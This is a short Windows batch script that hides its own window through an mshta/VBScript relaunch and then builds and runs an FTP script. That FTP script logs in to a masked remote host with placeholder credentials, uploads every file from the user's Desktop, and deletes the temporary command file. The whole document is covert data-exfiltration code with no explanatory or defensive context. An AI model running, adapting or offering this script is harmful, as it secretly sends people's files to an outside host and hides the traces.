%1 mshta vbscript:CreateObject("WScript.Shell").Run("%~s0 ::",0,FALSE)(window.close)&&exit
@Echo Off
Echo open xxx.xxx.xxx.xxx>ftp.up
Echo username>>ftp.up
Echo password>>ftp.up
Echo binary>>ftp.up
Echo prompt >>ftp.up
Echo mput %userprofile%\Desktop\*.*>>ftp.up
Echo bye>>ftp.up
FTP -s:ftp.up
del ftp.up /q
